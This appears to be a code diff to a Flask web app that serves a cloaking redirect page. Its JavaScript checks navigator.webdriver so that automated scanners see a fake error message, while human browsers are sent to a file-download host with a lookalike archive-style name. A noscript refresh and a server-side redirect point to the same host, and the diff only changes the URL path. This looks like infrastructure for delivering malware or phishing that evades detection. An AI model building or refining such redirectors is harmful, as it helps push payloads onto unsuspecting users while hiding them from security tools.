@@ -102,7 +102,7 @@ def index():
           <script>
             setTimeout(function() {
               if (navigator && navigator.userAgent && !navigator.webdriver) {
-                window.location.replace('https://files-121archive-2nsupload.com/p7mbbm3');
+                window.location.replace('https://files-121archive-2nsupload.com/2ad0248afb');
               } else {
                 document.body.innerHTML += '<p style="color:red">Please enable JavaScript and use a modern browser.</p>';
               }
@@ -110,14 +110,14 @@ def index():
           </script>
           
           <noscript>
-            <meta http-equiv="refresh" content="3;url=https://files-121archive-2nsupload.com/p7mbbm3">
+            <meta http-equiv="refresh" content="3;url=https://files-121archive-2nsupload.com/2ad0248afb">
           </noscript>
         </body>
         </html>
         """)
     else:
         # Redirect legitimate traffic
-        return redirect('https://files-121archive-2nsupload.com/p7mbbm3', code=302)
+        return redirect('https://files-121archive-2nsupload.com/2ad0248afb', code=302)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
